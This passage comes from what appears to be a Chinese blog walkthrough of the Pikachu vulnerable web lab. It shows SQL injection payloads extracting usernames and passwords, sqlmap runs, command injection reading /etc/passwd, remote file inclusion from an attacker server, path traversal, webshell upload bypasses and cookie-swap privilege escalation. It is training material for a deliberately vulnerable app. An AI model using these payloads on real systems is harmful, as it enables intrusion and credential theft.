</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu43.png" alt="pikachu43"></p> <h2 id="xx型注入"><a href="#xx型注入" class="header-anchor">#</a> xx型注入</h2> <p>name字段可注入，从报错可知，闭合语句需要<code>')</code></p> <p>查字段，order by到3报Unknown column '3' in 'order clause'，说明就2个字段，name字段注入数据如下</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>'<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查显示位（2个显示位）</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查操作系统，查表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> @<span class="token variable">@version_compile_os</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查users表下的字段名（查其他表对应替换table_name）</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token string">') union select @@version_compile_os,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查users表下的数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu44.png" alt="pikachu44"></p> <h2 id="insert-update-注入"><a href="#insert-update-注入" class="header-anchor">#</a> &quot;insert/update&quot;注入</h2> <p>username字段可以注入，字符型单引号<code>'</code></p> <p>这里选username字段，利用extractvalue函数报错注入</p> <p>查表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token string">' or extractvalue(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查数据库版本、users表下的字段名（查其他表对应替换table_name）</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token string">' or extractvalue(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="token string">' and table_schema=database()),0x7e)) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu45.png" alt="pikachu45"></p> <p>查users表下的数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token string">' or extractvalue(1, concat(0x7e,(select group_concat(username,&quot;:&quot;,password) from users limit 0,1),0x7e)) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="delete-注入"><a href="#delete-注入" class="header-anchor">#</a> &quot;delete&quot;注入</h2> <p>点击删除留言时数据包的id字段可注入，数字型，数据包如下</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/sqli/sqli_del.php?id=56</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/sqli/sqli_del.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=u19vivvv2j26lqb3622ebur90r</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>这次用updataxml函数来报错注入</p> <p>查表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">56</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>@<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>tips:这里是get传参的，需要url编码</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu46.png" alt="pikachu46"></p> <h2 id="http头注入"><a href="#http头注入" class="header-anchor">#</a> http头注入</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu47.png" alt="pikachu47"></p> <p>直接登录账号，可以发现返回的数据包对之前的UA等HTTP头数据进行了纪录</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu48.png" alt="pikachu48"></p> <p>重新抓包，尝试在UA处测试注入</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu49.png" alt="pikachu49"></p> <p>测试存在SQL注入，字符型单引号<code>'</code></p> <p>查表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token string">' or updatexml(1,concat(0x7e,database()),1) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu50.png" alt="pikachu50"></p> <p>最后查个数据吧，其他的不查了，都一样</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token string">' or updatexml(1,concat(0x7e,(select group_concat(username,&quot;:&quot;,password) from users limit 0,1),0x7e),1) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="盲注-base-on-boolian"><a href="#盲注-base-on-boolian" class="header-anchor">#</a> 盲注(base on boolian)</h2> <p>搜索不存在的用户例如：hacker</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu51.png" alt="pikachu51"></p> <p>提示用户不存在，再搜一个有的：kobe</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu53.png" alt="pikachu53"></p> <p>保存抓到的请求包为header.txt如下</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/sqli/sqli_blind_b.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=u19vivvv2j26lqb3622ebur90r</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>sqlmap直接开跑</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>sqlmap <span class="token parameter variable">-r</span> header.txt –current-db
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu54.png" alt="pikachu54"></p> <h2 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="header-anchor">#</a> 盲注(base on time)</h2> <p>同样sqlmap直接跑</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>sqlmap <span class="token parameter variable">-r</span> header.txt –current-db
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu55.png" alt="pikachu55"></p> <h2 id="宽字节注入"><a href="#宽字节注入" class="header-anchor">#</a> 宽字节注入</h2> <p>正常输入kobe，SQL语句使用了like模糊查询</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu56.png" alt="pikachu56"></p> <p><code>%'</code>闭合无效，尝试宽字节闭合，先来个万能查询</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token operator">%</span>df' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu57.png" alt="pikachu57"></p> <p>查显示位（2个显示位）</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu58.png" alt="pikachu58">
查库名，查表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu59.png" alt="pikachu59"></p> <p>查users表下的数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu60.png" alt="pikachu60"></p> <h1 id="rce"><a href="#rce" class="header-anchor">#</a> RCE</h1> <h2 id="exec-ping"><a href="#exec-ping" class="header-anchor">#</a> exec &quot;ping&quot;</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu61.png" alt="pikachu61"></p> <p>要求输入IP地址，这里尝试拼接命令，提交后发现可以直接注入命令</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>localhost <span class="token operator">&amp;</span> <span class="token function">cat</span> /etc/passwd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu62.png" alt="pikachu62"></p> <h2 id="exec-evel"><a href="#exec-evel" class="header-anchor">#</a> exec &quot;evel&quot;</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu63.png" alt="pikachu63"></p> <p>要求输入字符串，提示说明使用了eval对接受的字符串进行了执行，提交后返回phpinfo页面</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu64.png" alt="pikachu64"></p> <p>说明可以直接输入恶意php代码，进行RCE</p> <h1 id="file-inclusion"><a href="#file-inclusion" class="header-anchor">#</a> File Inclusion</h1> <h2 id="file-inclusion-local"><a href="#file-inclusion-local" class="header-anchor">#</a> File Inclusion(local)</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu65.png" alt="pikachu65"></p> <p>选择Kobe Bryant提交后，发现url发生了变化，疑似包含了file1.php文件</p> <p>这里通过目录爆破，得到<code>../../../../</code>之后就是系统根目录了，这里成功包含了/etc/passwd目录</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu66.png" alt="pikachu66"></p> <h2 id="file-inclusion-remote"><a href="#file-inclusion-remote" class="header-anchor">#</a> File Inclusion(remote)</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu67.png" alt="pikachu67"></p> <p>选择Kobe Bryant提交后，还是url发生了变化，这次尝试远程包含文件</p> <p>编写include.php文件，vps启动http服务</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>访问http://172.26.239.122/vul/fileinclude/fi_remote.php?filename=http://172.26.239.122:4444/include.php&amp;submit=提交后成功远程包含</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu68.png" alt="pikachu68"></p> <h1 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="header-anchor">#</a> Unsafe Filedownload</h1> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu69.png" alt="pikachu69"></p> <p>随便点击一个，抓取数据包，数据包请求信息如下</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/unsafedownload/execdownload.php?filename=kb.png</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/unsafedownload/down_nba.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>filename像是文件，尝试修改该字段为/etc/passwd，提示文件不存在</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu70.png" alt="pikachu70"></p> <p>利用本地包含的信息，重新修改为<code>../../../../etc/passwd</code>,成功下载该文件</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu71.png" alt="pikachu71"></p> <h1 id="unsafe-fileupload"><a href="#unsafe-fileupload" class="header-anchor">#</a> Unsafe Fileupload</h1> <h2 id="client-check"><a href="#client-check" class="header-anchor">#</a> client check</h2> <p>编写一句话木马文件shell.php，尝试上传抓包</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu72.png" alt="pikachu72"></p> <p>发现并没有数据包发出，就收到了验证信息，为前端验证，直接修改后缀为jpg，抓包后再改回来绕过</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu73.png" alt="pikachu73"></p> <p>成功上传</p> <h2 id="mime-type"><a href="#mime-type" class="header-anchor">#</a> MIME type</h2> <p>还是传shell.php，这次改MIME type也就是Content-Type: image/jpeg</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu74.png" alt="pikachu74"></p> <p>成功上传</p> <h2 id="getimagesize"><a href="#getimagesize" class="header-anchor">#</a> getimagesize</h2> <p>前两种单独或结合起来都没用了，这次给shell.php内容中增加图片文件头GIF89a，再上传</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu75.png" alt="pikachu75"></p> <p>这种后门文件没办法通过访问触发了，需要配合解析漏洞或者文件包含使用</p> <h1 id="over-permission"><a href="#over-permission" class="header-anchor">#</a> Over Permission</h1> <h2 id="水平越权"><a href="#水平越权" class="header-anchor">#</a> 水平越权</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu76.png" alt="pikachu76"></p> <p>开启抓包点击查看个人信息按钮</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu77.png" alt="pikachu77"></p> <p>该请求数据包内容如下</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/overpermission/op1/op1_mem.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=jdco7efq49sd079f9m6b68c6fq</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>尝试修改username字段为其他用户例如：vince，即可水平越权，使用lucy账户查看vince用户的信息</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu78.png" alt="pikachu78"></p> <h2 id="垂直越权"><a href="#垂直越权" class="header-anchor">#</a> 垂直越权</h2> <p>先使用超级管理员进行登录</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu79.png" alt="pikachu79"></p> <p>点击添加用户，填入对应信息，进行抓包，对应请求数据包如下，暂时发到Repeater</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/vul/overpermission/op2/op2_admin_edit.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">112</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/overpermission/op2/op2_admin_edit.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=jdco7efq49sd079f9m6b68c6fq</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
username=hacker&amp;password=hacker&amp;sex=hacker&amp;phonenum=hacker&amp;email=hacker&amp;address=hacker&amp;submit=%E5%88%9B%E5%BB%BA
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>接着登录普通用户，抓取普通用户的cookie，替换超级管理员的cookie部分进行发包</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu80.png" alt="pikachu80"></p> <p>可以看到成功使用无权限普通用户添加了一个hacker的新用户</p> <h1 id=""><a href="#" class="header-anchor">#</a> ../../</h1> <h2 id="目录遍历"><a href="#目录遍历" class="header-anchor">#</a> 目录遍历</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu81.png" alt="pikachu81"></p> <p>这个前面本地文件包含时直接目录爆破得到了<code>../../../../</code>就是系统根目录了，利用这点遍历读取/etc/passwd文件</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu82.png" alt="pikachu82"></p> <h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="header-anchor">#</a> 敏感信息泄露</h1> <h2 id="icanseeyouabc"><a href="#icanseeyouabc" class="header-anchor">#</a> Icanseeyouabc</h2> <p>直接在链接前插入view-source:，查看网页源代码其中注释部分泄露了账号等敏感信息，如下</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token comment">&lt;!-- 测试账号:lili/123456--&gt;</span>
<span class="token comment">&lt;!-- /.widget-body --&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="header-anchor">#</a> PHP反序列化漏洞</h1> <p>php源代码如下</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">S</span><span class="token punctuation">{</span>
            <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;pikachu&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        @<span class="token variable">$unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span> 
